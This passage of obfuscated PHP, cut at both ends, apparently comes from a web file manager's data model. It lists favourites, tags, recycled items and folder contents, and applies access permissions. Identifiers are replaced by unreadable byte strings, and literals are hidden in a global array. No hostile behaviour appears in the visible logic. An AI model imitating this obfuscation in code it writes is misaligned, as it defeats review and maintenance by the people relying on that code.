if (isset($Ü—èŸªÜ[$ƒ²¿Î«í[489]]) && $Ü—èŸªÜ[$ƒ²¿Î«í[489]][$ƒ²¿Î«í[490]] == -1) { $îâ¹œÃ¤ = $é›Á®Æ¦; } $Ü—èŸªÜ = array_field_key($Ü—èŸªÜ, $îâ¹œÃ¤); return $Ü—èŸªÜ; } public function listUserFav() { $ŒÃåµûÆ =& $_SERVER[Š—Â“œÔ]; $Æ‹İ³ÎŸ = Model($ŒÃåµûÆ[491])->listData(); $ªø™­Üƒ = array_filter_by_field($Æ‹İ³ÎŸ, $ŒÃåµûÆ[33], $ŒÃåµûÆ[492]); $ªø™­Üƒ = array_to_keyvalue($ªø™­Üƒ, $ŒÃåµûÆ[12], $ŒÃåµûÆ[87]); if ($ªø™­Üƒ) { $ÕûšÌÜ” = $this->listSource(array($ŒÃåµûÆ[493] => array($ŒÃåµûÆ[494], $ªø™­Üƒ))); } $ÕûšÌÜ” = array_to_keyvalue($ÕûšÌÜ”[$ŒÃåµûÆ[447]], $ŒÃåµûÆ[193]); foreach ($Æ‹İ³ÎŸ as &$óÓ¯Ÿú­) { $óÓ¯Ÿú­ = array($ŒÃåµûÆ[495] => $óÓ¯Ÿú­[$ŒÃåµûÆ[477]], $ŒÃåµûÆ[496] => $óÓ¯Ÿú­[$ŒÃåµûÆ[32]], $ŒÃåµûÆ[497] => $óÓ¯Ÿú­[$ŒÃåµûÆ[87]], $ŒÃåµûÆ[498] => $óÓ¯Ÿú­[$ŒÃåµûÆ[33]], $ŒÃåµûÆ[499] => $óÓ¯Ÿú­[$ŒÃåµûÆ[233]], $ŒÃåµûÆ[500] => $óÓ¯Ÿú­[$ŒÃåµûÆ[88]]); if ($óÓ¯Ÿú­[$ŒÃåµûÆ[33]] == $ŒÃåµûÆ[492] && $ÕûšÌÜ”[$óÓ¯Ÿú­[$ŒÃåµûÆ[87]]]) { $óÓ¯Ÿú­[$ŒÃåµûÆ[90]] = $ÕûšÌÜ”[$óÓ¯Ÿú­[$ŒÃåµûÆ[87]]]; } } unset($óÓ¯Ÿú­); return $Æ‹İ³ÎŸ; } public function listUserTag($²¼•²Ñ) { $›ƒş·üô =& $_SERVER[Š—Â“œÔ]; if ($²¼•²Ñ && !is_array($²¼•²Ñ)) { $²¼•²Ñ = array($²¼•²Ñ); } $ÊÌóÂ»Â = Model($›ƒş·üô[501])->listData(); $ğæşÑ»ş = array(); $‡­ÍÍ‡ = array(); foreach ($ÊÌóÂ»Â as $‹™Ùšß¶) { $·§ÙãÄ‚ = $‹™Ùšß¶[$›ƒş·üô[87]]; if (!$·§ÙãÄ‚) { continue; } if (!isset($‡­ÍÍ‡[$·§ÙãÄ‚])) { $‡­ÍÍ‡[$·§ÙãÄ‚] = array(); } $‡­ÍÍ‡[$·§ÙãÄ‚][] = $‹™Ùšß¶[$›ƒş·üô[502]]; $ğæşÑ»ş[$‹™Ùšß¶[$›ƒş·üô[87]]] = $‹™Ùšß¶; } $÷…Ç†•€ = array(); $„È¼¥‰ß = array(); $³¤ç¢ƒ = array(); foreach ($‡­ÍÍ‡ as $‚ìÂ‰ç => $ñŒ€ºÒÒ) { $«ùøÌè¡ = !0; if (!$²¼•²Ñ) { $÷…Ç†•€[] = $‚ìÂ‰ç; continue; } foreach ($²¼•²Ñ as $ØŒÆ ıè) { if (!in_array($ØŒÆ ıè, $ñŒ€ºÒÒ)) { $«ùøÌè¡ = !1; break; } } if (!$«ùøÌè¡) { continue; } if (!is_numeric($‚ìÂ‰ç)) { $Ş÷ŒÏ¬ç = $ğæşÑ»ş[$‚ìÂ‰ç]; $º’áùò€ = array($›ƒş·üô[32] => $Ş÷ŒÏ¬ç[$›ƒş·üô[32]], $›ƒş·üô[87] => $Ş÷ŒÏ¬ç[$›ƒş·üô[87]], $›ƒş·üô[33] => $Ş÷ŒÏ¬ç[$›ƒş·üô[33]], $›ƒş·üô[90] => array($›ƒş·üô[503] => 1), $›ƒş·üô[234] => !0); if ($Ş÷ŒÏ¬ç[$›ƒş·üô[33]] == $›ƒş·üô[232]) { $³¤ç¢ƒ[] = $º’áùò€; } if ($Ş÷ŒÏ¬ç[$›ƒş·üô[33]] == $›ƒş·üô[78]) { $„È¼¥‰ß[] = $º’áùò€; } continue; } $÷…Ç†•€[] = $‚ìÂ‰ç; } if ($÷…Ç†•€) { $øäûº¶— = $this->listSource(array($›ƒş·üô[493] => array($›ƒş·üô[494], $÷…Ç†•€))); } $øäûº¶— = $øäûº¶— ? $øäûº¶— : array($›ƒş·üô[85] => array(), $›ƒş·üô[86] => array()); $øäûº¶—[$›ƒş·üô[85]] = array_merge($øäûº¶—[$›ƒş·üô[85]], $„È¼¥‰ß); $øäûº¶—[$›ƒş·üô[86]] = array_merge($øäûº¶—[$›ƒş·üô[86]], $³¤ç¢ƒ); if (isset($øäûº¶—[$›ƒş·üô[444]]) && count($÷…Ç†•€) == $øäûº¶—[$›ƒş·üô[444]][$›ƒş·üô[445]]) { return $øäûº¶—; } $éÅ§Ì–ˆ = array(); $ ÍóæŸ¥ = array_to_keyvalue($øäûº¶—[$›ƒş·üô[85]], $›ƒş·üô[12], $›ƒş·üô[193]); $ŒÙ˜àÙê = array_to_keyvalue($øäûº¶—[$›ƒş·üô[86]], $›ƒş·üô[12], $›ƒş·üô[193]); $ı•›©Áá = array_merge($ŒÙ˜àÙê, $ ÍóæŸ¥); foreach ($÷…Ç†•€ as $·§ÙãÄ‚) { if (!in_array($·§ÙãÄ‚, $ı•›©Áá)) { $éÅ§Ì–ˆ[] = $·§ÙãÄ‚; } } if ($éÅ§Ì–ˆ) { Model($›ƒş·üô[504])->removeBySource($éÅ§Ì–ˆ); } return $øäûº¶—; } public function listUserRecycle() { $×Øîà«‘ =& $_SERVER[Š—Â“œÔ]; $¤Úü¥ø = Model($×Øîà«‘[505])->listData(); if (!$¤Úü¥ø) { return array(); } $Üîîñ€œ = array($×Øîà«‘[493] => array($×Øîà«‘[494], $¤Úü¥ø), $×Øîà«‘[506] => 1); return $this->listSource($Üîîñ€œ); } public function listSource($²“òøˆ, $»¦€àõÒ = 3000, $˜Ò§¨¬¶ = false) { $î— £×‘ =& $_SERVER[Š—Â“œÔ]; if (!isset($²“òøˆ[$î— £×‘[507]])) { $²“òøˆ[$î— £×‘[507]] = 0; } if (isset($²“òøˆ[$î— £×‘[192]]) && $²“òøˆ[$î— £×‘[192]] == $î— £×‘[230]) { $²“òøˆ[$î— £×‘[488]] = array($î— £×‘[508], $î— £×‘[12]); } $í˜×Í = $î— £×‘[509]; $òÆ¿‚ò = $this->field($í˜×Í)->_makeOrder()->where($²“òøˆ)->selectPage($»¦€àõÒ); $this->_listPageCheck($òÆ¿‚ò, $í˜×Í, $²“òøˆ); $this->_listDataApply($òÆ¿‚ò[$î— £×‘[447]], $˜Ò§¨¬¶); $this->_listMake($òÆ¿‚ò); return $òÆ¿‚ò; } private function _listPageCheck(&$à€¨İ°×, $ĞÜ‰‡Ğ¯, $«Âô­ö§) { $Ø¿Ë‡¹Œ =& $_SERVER[Š—Â“œÔ]; if (!is_array($à€¨İ°×[$Ø¿Ë‡¹Œ[444]])) { return; } $ÍäèªÚš = $à€¨İ°×[$Ø¿Ë‡¹Œ[444]]; if ($ÍäèªÚš[$Ø¿Ë‡¹Œ[446]] <= 1) { return; } if ($ÍäèªÚš[$Ø¿Ë‡¹Œ[445]] >= 100000) { return; } if (Model($Ø¿Ë‡¹Œ[510])->get($Ø¿Ë‡¹Œ[511]) != $Ø¿Ë‡¹Œ[512]) { return; } $ĞÜ‰‡Ğ¯ = str_replace(array($Ø¿Ë‡¹Œ[53], $Ø¿Ë‡¹Œ[419], $Ø¿Ë‡¹Œ[287]), $Ø¿Ë‡¹Œ[12], $ĞÜ‰‡Ğ¯); $ĞÜ‰‡Ğ¯ = $Ø¿Ë‡¹Œ[513] . str_replace($Ø¿Ë‡¹Œ[50], $Ø¿Ë‡¹Œ[514], $ĞÜ‰‡Ğ¯) . $Ø¿Ë‡¹Œ[515]; $§Èµ™Â† = $Ø¿Ë‡¹Œ[516]; $§Èµ™Â† = $§Èµ™Â† . $Ø¿Ë‡¹Œ[517]; $Òæ«·– = $ÍäèªÚš[$Ø¿Ë‡¹Œ[441]] * ($ÍäèªÚš[$Ø¿Ë‡¹Œ[430]] - 1) . $Ø¿Ë‡¹Œ[50] . $ÍäèªÚš[$Ø¿Ë‡¹Œ[441]]; $ì×…Èà  = $this->_makeOrder(!0); $Ÿ»¹°‚É = $Ø¿Ë‡¹Œ[513] . str_replace($Ø¿Ë‡¹Œ[50], $Ø¿Ë‡¹Œ[514], $ì×…Èà [0]); if (strpos($Ÿ»¹°‚É, $Ø¿Ë‡¹Œ[518])) { $Ÿ»¹°‚É = str_replace($Ø¿Ë‡¹Œ[518], $Ø¿Ë‡¹Œ[519], $Ÿ»¹°‚É); } else { $Ÿ»¹°‚É .= $Ø¿Ë‡¹Œ[520] . $ì×…Èà [1]; } $ç€ûÚÜ¹ = array(); foreach ($«Âô­ö§ as $Ã£–Åò => $í¸¹ÃÁ) { $ç€ûÚÜ¹[$Ø¿Ë‡¹Œ[513] . $Ã£–Åò] = $í¸¹ÃÁ; } $this->alias($Ø¿Ë‡¹Œ[521])->field($ĞÜ‰‡Ğ¯)->limit($Òæ«·–)->order($Ÿ»¹°‚É); $óêÉŒ˜è = $this->join($§Èµ™Â†)->where($ç€ûÚÜ¹)->select(); if ($óêÉŒ˜è) { $à€¨İ°×[$Ø¿Ë‡¹Œ[447]] = $óêÉŒ˜è; } } protected function _makeOrder($…Š¯Ó¼® = false) { $á”–Ú =& $_SERVER[Š—Â“œÔ]; $éÈöªôÎ = Model($á”–Ú[522])->get($á”–Ú[523]); $œıÕ‰Ô» = Model($á”–Ú[522])->get($á”–Ú[524]); $¾¹°Ûö‹ = array($á”–Ú[525] => $á”–Ú[526], $á”–Ú[527] => $á”–Ú[528]); $‘¢¨Ş—Ò = array($á”–Ú[32] => $á”–Ú[32], $á”–Ú[79] => $á”–Ú[79], $á”–Ú[169] => $á”–Ú[488], $á”–Ú[529] => $á”–Ú[529], $á”–Ú[530] => $á”–Ú[531], $á”–Ú[233] => $á”–Ú[233], $á”–Ú[88] => $á”–Ú[88]); $µë“ ‘¤ = Input::get($á”–Ú[532], $á”–Ú[7], $éÈöªôÎ, array_keys($‘¢¨Ş—Ò)); $èŞ’ûâµ = Input::get($á”–Ú[533], $á”–Ú[7], $œıÕ‰Ô», array_keys($¾¹°Ûö‹)); if (!in_array($µë“ ‘¤, array_keys($‘¢¨Ş—Ò))) { $µë“ ‘¤ = $á”–Ú[32]; } if (!in_array($èŞ’ûâµ, array_keys($¾¹°Ûö‹))) { $µë“ ‘¤ = $á”–Ú[525]; } if ($µë“ ‘¤ == $á”–Ú[32]) { } $™î´İ¹Ü = $á”–Ú[534] . $‘¢¨Ş—Ò[$µë“ ‘¤] . $á”–Ú[53] . $¾¹°Ûö‹[$èŞ’ûâµ]; $™î´İ¹Ü = rtrim(trim($™î´İ¹Ü), $á”–Ú[50]); if ($…Š¯Ó¼®) { return array($™î´İ¹Ü, $¾¹°Ûö‹[$èŞ’ûâµ]); } return $this->order($™î´İ¹Ü); } protected function _listDataApplyItem($—¦²ßš, $–¬Ä€å‹ = false) { $À“àı© = array($—¦²ßš); $this->_listDataApply($À“àı©, $–¬Ä€å‹); return $À“àı©[0]; } protected function _listDataApply(&$Úøëí», $Ï±½‘µÏ = false) { $Ï‘¼¹ø  =& $_SERVER[Š—Â“œÔ]; if (!$Úøëí») { $Úøëí» = array(); return; } $°ŞÛÍûÀ = array_to_keyvalue($Úøëí», $Ï‘¼¹ø [12], $Ï‘¼¹ø [193]); $°ŞÛÍûÀ = array_unique($°ŞÛÍûÀ); $this->_listSourceCache($Úøëí»); if (!$Ï±½‘µÏ) { $this->_listAppendMeta($Úøëí», $°ŞÛÍûÀ); $this->_listAppendFileMeta($Úøëí», $°ŞÛÍûÀ); $this->_listAppendChildren($Úøëí», $°ŞÛÍûÀ); } $this->_listAppendPath($Úøëí»); $this->_listAppendAuth($Úøëí»); $this->_listAppendSourceInfo($Úøëí», $°ŞÛÍûÀ); $this->_listAppendUser($Úøëí»); $this->_listFilterInfo($Úøëí», $Ï±½‘µÏ); $this->_listAppendAuthSecret($Úøëí»); } protected function _listSourceCache($ş·­‚¥†) { $’à¾âç¶ =& $_SERVER[Š—Â“œÔ]; foreach ($ş·­‚¥† as $é¯òŞÏı) { self::$cacheSourceInfo[$’à¾âç¶[535] . $é¯òŞÏı[$’à¾âç¶[193]]] = $é¯òŞÏı; } } protected function _listFilterInfo(&$Ş²¬Î‰¹, $µÇ˜£»æ = false) { $ŸÁùİÊ =& $_SERVER[Š—Â“œÔ]; foreach ($Ş²¬Î‰¹ as &$ö†÷±ï) { $ö†÷±ï = $this->pathInfoFilter($ö†÷±ï); self::$cachePathInfo[$ŸÁùİÊ[536] . intval($µÇ˜£»æ) . $ŸÁùİÊ[464] . $ö†÷±ï[$ŸÁùİÊ[193]]] = $ö†÷±ï; } unset($ö†÷±ï); } protected function _listMake(&$Òñï´¾›) { $’Ğìãˆ =& $_SERVER[Š—Â“œÔ]; $Òñï´¾›[$’Ğìãˆ[85]] = array(); $Òñï´¾›[$’Ğìãˆ[86]] = array(); foreach ($Òñï´¾›[$’Ğìãˆ[447]] as $ì´”„¥ª) { $©¢×Âª¿ = $ì´”„¥ª[$’Ğìãˆ[487]] == 1 ? $’Ğìãˆ[85] : $’Ğìãˆ[86]; $Òñï´¾›[$©¢×Âª¿][] = $ì´”„¥ª; } unset($Òñï´¾›[$’Ğìãˆ[447]]); } protected function _listAppendMeta(&$½“ÓÀ½, $ŠõºˆŸ) { $Š±ˆÙöğ =& $_SERVER[Š—Â“œÔ]; $õæó×¥ = array($Š±ˆÙöğ[493] => array($Š±ˆÙöğ[494], $ŠõºˆŸ)); $‡’ÍÒ±¿ = Model($Š±ˆÙöğ[537])->field($Š±ˆÙöğ[538])->where($õæó×¥)->select(); if (!$‡’ÍÒ±¿) { return; } $”ã·ªÆ¼ = array($Š±ˆÙöğ[539], $Š±ˆÙöğ[540], $Š±ˆÙöğ[519]); $¸ô®Ó«ş = array(); foreach ($‡’ÍÒ±¿ as $ çõ´â·) { if (!isset($¸ô®Ó«ş[$ çõ´â·[$Š±ˆÙöğ[193]]])) { $¸ô®Ó«ş[$ çõ´â·[$Š±ˆÙöğ[193]]] = array(); } if (in_array($ çõ´â·[$Š±ˆÙöğ[97]], $”ã·ªÆ¼)) { continue; } $¸ô®Ó«ş[$ çõ´â·[$Š±ˆÙöğ[193]]][$ çõ´â·[$Š±ˆÙöğ[97]]] = $ çõ´â·[$Š±ˆÙöğ[452]]; } foreach ($½“ÓÀ½ as &$„³’“ƒ) { $„³’“ƒ[$Š±ˆÙöğ[541]] = !1; if (isset($¸ô®Ó«ş[$„³’“ƒ[$Š±ˆÙöğ[193]]])) { $„³’“ƒ[$Š±ˆÙöğ[541]] = $¸ô®Ó«ş[$„³’“ƒ[$Š±ˆÙöğ[193]]]; } if ($this->fileIsLock($„³’“ƒ) && $„³’“ƒ[$Š±ˆÙöğ[489]]) { $Ëâñ„á¶ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $„³’“ƒ[$Š±ˆÙöğ[489]][$Š±ˆÙöğ[490]] = AuthModel::authDisable($„³’“ƒ[$Š±ˆÙöğ[489]][$Š±ˆÙöğ[490]], $Ëâñ„á¶); $„³’“ƒ[$Š±ˆÙöğ[489]][$Š±ˆÙöğ[542]][$Š±ˆÙöğ[489]] = $„³’“ƒ[$Š±ˆÙöğ[489]][$Š±ˆÙöğ[490]]; } } unset($„³’“ƒ); } protected function _listAppendFileMeta(&$¬ºìÀ—, $˜Âè§Âí) { $„¯ÀÔ£‚ =& $_SERVER[Š—Â“œÔ]; $Îò–î±¥ = array_to_keyvalue($¬ºìÀ—, $„¯ÀÔ£‚[12], $„¯ÀÔ£‚[543]); $Îò–î±¥ = array_filter(array_unique($Îò–î±¥)); if (!$Îò–î±¥) { return; } $…™ÅÙ¹Ù = array($„¯ÀÔ£‚[544] => array($„¯ÀÔ£‚[494], $Îò–î±¥)); $¤Ã¤ï‰’ = $„¯ÀÔ£‚[545]; $´Ïé— = Model($„¯ÀÔ£‚[546])->field($¤Ã¤ï‰’)->where($…™ÅÙ¹Ù)->select(); $´Ïé— = array_to_keyvalue($´Ïé—, $„¯ÀÔ£‚[543]); $Ïéİˆ‹Ş = Model($„¯ÀÔ£‚[547])->field($„¯ÀÔ£‚[548])->where($…™ÅÙ¹Ù)->select(); $Ïéİˆ‹Ş = $Ïéİˆ‹Ş ? $Ïéİˆ‹Ş : array(); $— Ëé£ = array(); foreach ($Ïéİˆ‹Ş as $ƒ–‰Û°À) { if (!isset($— Ëé£[$ƒ–‰Û°À[$„¯ÀÔ£‚[543]]])) { $— Ëé£[$ƒ–‰Û°À[$„¯ÀÔ£‚[543]]] = array(); } $— Ëé£[$ƒ–‰Û°À[$„¯ÀÔ£‚[543]]][$ƒ–‰Û°À[$„¯ÀÔ£‚[97]]] = $ƒ–‰Û°À[$„¯ÀÔ£‚[452]]; } foreach ($¬ºìÀ— as &$ÁÍÌüœ) { $…ä¤Éï« = $ÁÍÌüœ[$„¯ÀÔ£‚[543]]; if (!$…ä¤Éï« || !is_array($´Ïé—[$…ä¤Éï«])) { continue; } $ÏğˆÂÆ = $´Ïé—[$…ä¤Éï«]; $ÏğˆÂÆ[$„¯ÀÔ£‚[79]] = $ÁÍÌüœ[$„¯ÀÔ£‚[79]]; $ÏğˆÂÆ[$„¯ÀÔ£‚[32]] = $ÁÍÌüœ[$„¯ÀÔ£‚[32]]; if (!$ÏğˆÂÆ[$„¯ÀÔ£‚[549]]) { Model($„¯ÀÔ£‚[546])->fileMd5Check($ÏğˆÂÆ); } if (!isset(self::$cacheFileInfo[$„¯ÀÔ£‚[550] . $…ä¤Éï«])) { self::$cacheFileInfo[$„¯ÀÔ£‚[550] . $…ä¤Éï«] = array_merge(array(), $ÏğˆÂÆ); } unset($´Ïé—[$…ä¤Éï«][$„¯ÀÔ£‚[87]]); $ä›Ìî´Å = isset($— Ëé£[$…ä¤Éï«]) && is_array($— Ëé£[$…ä¤Éï«]) ? $— Ëé£[$…ä¤Éï«] : array(); $ÁÍÌüœ[$„¯ÀÔ£‚[170]] = array_merge($ä›Ìî´Å, $´Ïé—[$…ä¤Éï«]); if (isset($ÁÍÌüœ[$„¯ÀÔ£‚[170]][$„¯ÀÔ£‚[184]])) { $ÁÍÌüœ[$„¯ÀÔ£‚[184]] = json_decode($ÁÍÌüœ[$„¯ÀÔ£‚[170]][$„¯ÀÔ£‚[184]], !0); unset($ÁÍÌüœ[$„¯ÀÔ£‚[170]][$„¯ÀÔ£‚[184]]); } } unset($ÁÍÌüœ); } protected function _listAppendSourceInfo(&$êº“ ˜à, $µõ»›õ) { $ÊáöË¥Â =& $_SERVER[Š—Â“œÔ]; $‰ºşë„” = Model($ÊáöË¥Â[551])->listData(); $Ùşû¦Í¹ = Model($ÊáöË¥Â[501])->listData(); $©¡ö´‘è = Model($ÊáöË¥Â[491])->listData(); $Ğ¦©à¨± = Model($ÊáöË¥Â[552])->listSimple(); $ÁäÇõû’ = array_to_keyvalue($‰ºşë„”, $ÊáöË¥Â[477]); $ıéŠÆóÏ = array_to_keyvalue_group($Ùşû¦Í¹, $ÊáöË¥Â[87], $ÊáöË¥Â[502]); $æïÃ‰É« = array_to_keyvalue($©¡ö´‘è, $ÊáöË¥Â[87]); $ÈÓş›ğ = array_to_keyvalue_group($Ğ¦©à¨±, $ÊáöË¥Â[193]); foreach ($êº“ ˜à as &$çîû©²) { $çîû©²[$ÊáöË¥Â[90]] = array($ÊáöË¥Â[553] => 0, $ÊáöË¥Â[554] => 0, $ÊáöË¥Â[555] => 0); if (isset($æïÃ‰É«[$çîû©²[$ÊáöË¥Â[193]]])) { $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[556]] = 1; $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[557]] = $æïÃ‰É«[$çîû©²[$ÊáöË¥Â[193]]][$ÊáöË¥Â[32]]; } if ($ıéŠÆóÏ && $ÁäÇõû’ && isset($ıéŠÆóÏ[$çîû©²[$ÊáöË¥Â[193]]])) { $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[558]] = array(); foreach ($ıéŠÆóÏ[$çîû©²[$ÊáöË¥Â[193]]] as $ü¸áã§Ô) { $»¾£¨Ô = $ÁäÇõû’[$ü¸áã§Ô]; $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[558]][] = array($ÊáöË¥Â[559] => $»¾£¨Ô[$ÊáöË¥Â[477]], $ÊáöË¥Â[496] => $»¾£¨Ô[$ÊáöË¥Â[32]], $ÊáöË¥Â[560] => $»¾£¨Ô[$ÊáöË¥Â[561]]); } } if ($ÈÓş›ğ && isset($ÈÓş›ğ[$çîû©²[$ÊáöË¥Â[193]]])) { $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[562]] = array(); foreach ($ÈÓş›ğ[$çîû©²[$ÊáöË¥Â[193]]] as $ææÖ‰Ø) { $²èï¾¯ = $ÊáöË¥Â[563]; if ($ææÖ‰Ø[$ÊáöË¥Â[564]] == $ÊáöË¥Â[91]) { $²èï¾¯ .= $ÊáöË¥Â[565]; } $çîû©²[$ÊáöË¥Â[90]][$ÊáöË¥Â[562]] = array_field_key($ææÖ‰Ø, explode($ÊáöË¥Â[50], $²èï¾¯)); } } } unset($çîû©²); return $êº“ ˜à; } protected function _listAppendChildren(&$…Ä¸ôõŠ, $ÔÕûâ‰±) { $ßã¹Ù·à =& $_SERVER[Š—Â“œÔ]; $Ìç–á‡£ = array(); $¦ìÎÍÚÓ = array($ßã¹Ù·à[241] => 0, $ßã¹Ù·à[242] => 0); foreach ($…Ä¸ôõŠ as &$±¯è‰é ) { if (!$±¯è‰é [$ßã¹Ù·à[487]]) { continue; } $Ìç–á‡£[] = $±¯è‰é [$ßã¹Ù·à[193]]; } unset($±¯è‰é ); if (!$Ìç–á‡£) { return; } $Ê×·±¯… = array($ßã¹Ù·à[192] => array($ßã¹Ù·à[7], $Ìç–á‡£), $ßã¹Ù·à[507] => 0); $Ü„…ü›ª = array($ßã¹Ù·à[192], $ßã¹Ù·à[487], $ßã¹Ù·à[566] => $ßã¹Ù·à[567]); $ğÌ¡ò½Ñ = $this->field($Ü„…ü›ª)->where($Ê×·±¯…)->group($ßã¹Ù·à[568])->select(); $í»˜ÉÚã = array(); foreach ($ğÌ¡ò½Ñ as $·€öà×õ) { $¼éœüíî = $·€öà×õ[$ßã¹Ù·à[192]]; $ÛœÅØ“ş = $·€öà×õ[$ßã¹Ù·à[487]] == $ßã¹Ù·à[91] ? $ßã¹Ù·à[242] : $ßã¹Ù·à[241]; if (!isset($í»˜ÉÚã[$¼éœüíî])) { $í»˜ÉÚã[$¼éœüíî] = array($ßã¹Ù·à[241] => 0, $ßã¹Ù·à[242] => 0); } $í»˜ÉÚã[$¼éœüíî][$ÛœÅØ“ş] += $·€öà×õ[$ßã¹Ù·à[567]]; } foreach ($…Ä¸ôõŠ as &$±¯è‰é ) { if (!$±¯è‰é [$ßã¹Ù·à[487]]) { continue; } $¯½¹è²ş = is_array($í»˜ÉÚã[$±¯è‰é [$ßã¹Ù·à[193]]]) ? $í»˜ÉÚã[$±¯è‰é [$ßã¹Ù·à[193]]] : $¦ìÎÍÚÓ; $±¯è‰é [$ßã¹Ù·à[242]] = $¯½¹è²ş[$ßã¹Ù·à[242]]; $±¯è‰é [$ßã¹Ù·à[241]] = $¯½¹è²ş[$ßã¹Ù·à[241]]; unset($±¯è‰é [$ßã¹Ù·à[488]]); } unset($±¯è‰é ); } protected function _listAppendAuth(&$«†Œ£) { $Í„•¥£­ =& $_SERVER[Š—Â“œÔ]; $é¶à†•Ğ = array(); foreach ($«†Œ£ as $éÛÍú¡) { if ($éÛÍú¡[$Í„•¥£­[190]] == self::TYPE_GROUP) { $é¶à†•Ğ[] = $éÛÍú¡[$Í„•¥£­[193]]; } } if (!$é¶à†•Ğ) { return; } $Åêì¥í¬ = array_to_keyvalue($«†Œ£, $Í„•¥£­[193]); $²¡·ïª = Model($Í„•¥£­[569])->getSourceList($é¶à†•Ğ, $Åêì¥í¬); $ß‰ÛŞÉ… = KodUser::isRoot(); foreach ($«†Œ£ as $¯’®ÓÇ => &$éÛÍú¡) { $éÛÍú¡[$Í„•¥£­[489]] = $²¡·ïª[$éÛÍú¡[$Í„•¥£­[193]]]; if (!$éÛÍú¡[$Í„•¥£­[489]] && $éÛÍú¡[$Í„•¥£­[190]] == self::TYPE_GROUP) { $éÛÍú¡[$Í„•¥£­[489]] = Action($Í„•¥£­[570])->pathGroupAuthMake($éÛÍú¡[$Í„•¥£­[571]]); if (!$éÛÍú¡[$Í„•¥£­[489]] && !$ß‰ÛŞÉ…) { $éÛÍú¡[$Í„•¥£­[235]] = !1; $éÛÍú¡[$Í„•¥£­[234]] = !1; } } if ($éÛÍú¡[$Í„•¥£­[489]]) { $éÛÍú¡[$Í„•¥£­[235]] = AuthModel::authCheckEdit($éÛÍú¡[$Í„•¥£­[489]][$Í„•¥£­[490]]); $éÛÍú¡[$Í„•¥£­[234]] = AuthModel::authCheckView($éÛÍú¡[$Í„•¥£­[489]][$Í„•¥£­[490]]); } $this->groupPathDisplay($éÛÍú¡); } unset($éÛÍú¡); } public function _listAppendAuthSecret(&$‘“™ÑøÓ) { $ï¡ıâ­à =& $_SERVER[Š—Â“œÔ]; if (Model($ï¡ıâ­à[510])->get($ï¡ıâ­à[572]) != $ï¡ıâ­à[91]) { return; } static $Û‡¼¬¶ = false; if (!$Û‡¼¬¶) { $Ø‹Ğàû = Model($ï¡ıâ­à[573]); $½ªÄï„İ = Model($ï¡ıâ­à[574]); $Û‡¼¬¶ = $½ªÄï„İ->listData(); $Û‡¼¬¶ = array_to_keyvalue($Û‡¼¬¶, $ï¡ıâ­à[193]); $æö¾‹É = json_decode(Model($ï¡ıâ­à[510])->get($ï¡ıâ­à[575]), !0); $æö¾‹É = array_to_keyvalue($æö¾‹É, $ï¡ıâ­à[477]); foreach ($Û‡¼¬¶ as $ß¯‡›³ı => $Áñ’åÔ¹) { $Ÿ¨šê¡° = $æö¾‹É[$Áñ’åÔ¹[$ï¡ıâ­à[576]]]; if (!$Ÿ¨šê¡°) { $½ªÄï„İ->remove($Áñ’åÔ¹[$ï¡ıâ­à[477]]); unset($Û‡¼¬¶[$ß¯‡›³ı]); continue; } $é’Ú×áñ = $Ø‹Ğàû->listData($Ÿ¨šê¡°[$ï¡ıâ­à[489]]); if (!$é’Ú×áñ) { $½ªÄï„İ->remove($Áñ’åÔ¹[$ï¡ıâ­à[477]]); unset($Û‡¼¬¶[$ß¯‡›³ı]); continue; } $Áñ’åÔ¹[$ï¡ıâ­à[489]] = $é’Ú×áñ; $Áñ’åÔ¹[$ï¡ıâ­à[577]] = $Ÿ¨šê¡°; $Áñ’åÔ¹[$ï¡ıâ­à[578]] = Model($ï¡ıâ­à[579])->getInfoSimpleOuter($Áñ’åÔ¹[$ï¡ıâ­à[529]]); $Û‡¼¬¶[$ß¯‡›³ı] = $Áñ’åÔ¹; } } $¾ªÖ‡«› = USER_ID; $÷®ş¯ë = array(); $¦áÊ³Áª = $this->_listAppendPath($÷®ş¯ë, !0); foreach ($‘“™ÑøÓ as $ß¯‡›³ı => &$Áñ’åÔ¹) { if (!is_array($Áñ’åÔ¹[$ï¡ıâ­à[489]])) { continue; } if ($Áñ’åÔ¹[$ï¡ıâ­à[190]] != $ï¡ıâ­à[580]) { continue; } if (isset($Û‡¼¬¶[$Áñ’åÔ¹[$ï¡ıâ­à[193]]])) { $òœöê¾÷ = $Û‡¼¬¶[$Áñ’åÔ¹[$ï¡ıâ­à[193]]]; if (!is_array($Áñ’åÔ¹[$ï¡ıâ­à[541]])) { $Áñ’åÔ¹[$ï¡ıâ­à[541]] = array(); } $Áñ’åÔ¹[$ï¡ıâ­à[541]][$ï¡ıâ­à[581]] = $òœöê¾÷[$ï¡ıâ­à[576]]; $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[582]] = $òœöê¾÷; $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[583]] = $Áñ’åÔ¹[$ï¡ıâ­à[584]]; $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[585]] = $ï¡ıâ­à[91]; if ($òœöê¾÷[$ï¡ıâ­à[529]] != $¾ªÖ‡«›) { $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[490]] = $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[490]] & $òœöê¾÷[$ï¡ıâ­à[489]][$ï¡ıâ­à[489]]; } continue; } $Ã±†’ò× = $this->parentLevelArray($Áñ’åÔ¹[$ï¡ıâ­à[586]]); $íœ‘åÉ = array_reverse($Ã±†’ò×); foreach ($íœ‘åÉ as $ôÊ£éİ => $şèİı†Ç) { if (!isset($Û‡¼¬¶[$şèİı†Ç])) { continue; } $òœöê¾÷ = $Û‡¼¬¶[$şèİı†Ç]; $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[582]] = $òœöê¾÷; if ($òœöê¾÷[$ï¡ıâ­à[529]] != $¾ªÖ‡«›) { $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[490]] = $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[490]] & $òœöê¾÷[$ï¡ıâ­à[489]][$ï¡ıâ­à[489]]; } $æÒ†Óà  = 